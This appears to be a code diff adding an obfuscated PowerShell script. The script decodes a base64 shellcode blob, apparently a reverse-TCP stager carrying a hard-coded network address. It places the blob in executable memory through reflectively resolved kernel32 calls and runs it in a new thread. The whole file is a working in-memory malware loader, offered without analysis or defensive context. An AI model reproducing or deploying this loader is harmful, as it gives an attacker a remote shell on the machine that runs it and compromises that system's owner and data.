@@ -1,0 +1,27 @@
+function pc8TaAdTtx {
+	Param ($e7hnRiqAn, $zDETn)		
+	$tEXzRFU = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	
+	return $tEXzRFU.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tEXzRFU.GetMethod('GetModuleHandle')).Invoke($null, @($e7hnRiqAn)))), $zDETn))
+}
+
+function pHYpwyGJl {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $xnPJTuuUFR,
+		[Parameter(Position = 1)] [Type] $s1s = [Void]
+	)
+	
+	$beK5XF8o9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$beK5XF8o9.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xnPJTuuUFR).SetImplementationFlags('Runtime, Managed')
+	$beK5XF8o9.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $s1s, $xnPJTuuUFR).SetImplementationFlags('Runtime, Managed')
+	
+	return $beK5XF8o9.CreateType()
+}
+
+[Byte[]]$q7lqZzuB = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAARXrBI+JEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
+		
+$he_DUV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pc8TaAdTtx kernel32.dll VirtualAlloc), (pHYpwyGJl @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $q7lqZzuB.Length,0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($q7lqZzuB, 0, $he_DUV, $q7lqZzuB.length)
+
+$d5cno5Cjt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pc8TaAdTtx kernel32.dll CreateThread), (pHYpwyGJl @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$he_DUV,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pc8TaAdTtx kernel32.dll WaitForSingleObject), (pHYpwyGJl @([IntPtr], [Int32]))).Invoke($d5cno5Cjt,0xffffffff) | Out-Null
